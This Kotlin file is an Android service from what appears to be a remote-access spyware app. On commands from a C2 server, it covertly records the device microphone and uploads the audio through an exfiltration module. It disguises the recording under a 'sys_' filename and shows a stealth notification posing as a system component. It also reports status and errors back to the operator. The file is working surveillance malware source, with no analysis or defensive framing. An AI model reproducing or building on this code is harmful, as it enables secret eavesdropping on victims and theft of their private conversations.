package com.sp.core.services

import android.app.*
import android.content.Context
import com.sp.core.util.StealthNotif
import android.content.Intent
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import com.sp.core.c2.Exfil
import com.sp.core.util.Fgs
import java.io.File

class MicRecorder : Service() {

    private var recorder: MediaRecorder? = null
    private var outFile: File? = null

    companion object {
        /* A duplicated command (the C2 delivered it twice) must not start a
           second recorder on top of the running one - the second one would
           fail and report "no_audio". */
        @Volatile
        private var busy = false
    }

    override fun onCreate() {
        super.onCreate()
        // The service runs with the "microphone" type - without it Android 14+
        // mutes the capture. If the type is not allowed (no RECORD_AUDIO
        // grant) the recording cannot work at all, so the C2 gets the reason
        // instead of a silent failure.
        if (!Fgs.start(
                this,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE,
                buildNotification(),
                fallbackType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            )) {
            Exfil.sendLog(
                this, "cmd_result",
                """{"cmd":"mic","ok":false,"reason":"no_record_audio_permission"}"""
            )
            stopSelf()
            return
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (busy) {
            Exfil.sendLog(this, "cmd_result", """{"cmd":"mic","ok":false,"reason":"busy"}""")
            stopSelf()
            return START_NOT_STICKY
        }
        busy = true
        val duration = intent?.getIntExtra("seconds", 60) ?: 60
        startRecording(duration)
        return START_NOT_STICKY
    }

    private fun startRecording(seconds: Int) {
        try {
            outFile = File(cacheDir, "sys_${System.currentTimeMillis()}.m4a")
            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                MediaRecorder(this) else @Suppress("DEPRECATION") MediaRecorder()
            recorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioEncodingBitRate(64_000)
                setAudioSamplingRate(22_050)
                setOutputFile(outFile!!.absolutePath)
                prepare(); start()
            }
            Handler(Looper.getMainLooper()).postDelayed({ stopAndSend() }, seconds * 1000L)
        } catch (t: Exception) {
            Exfil.sendLog(
                this, "cmd_result",
                """{"cmd":"mic","ok":false,"reason":"${t.javaClass.simpleName}"}"""
            )
            busy = false
            stopSelf()
        }
    }

    private fun stopAndSend() {
        try { recorder?.stop() } catch (_: Exception) {}
        recorder?.release(); recorder = null
        val f = outFile
        if (f != null && f.exists() && f.length() > 0) {
            val size = f.length()
            Exfil.uploadFile(this, f, "audio")
            Exfil.sendLog(
                this, "cmd_result",
                """{"cmd":"mic","ok":true,"file":"${f.name}","size":$size}"""
            )
        } else {
            Exfil.sendLog(this, "cmd_result", """{"cmd":"mic","ok":false,"reason":"no_audio"}""")
        }
        busy = false
        stopSelf()
    }

    private fun buildNotification(): Notification {
        return StealthNotif.build(this, "android_UI", "Systémová komponenta beží")
    }
    override fun onBind(intent: Intent?): IBinder? = null
}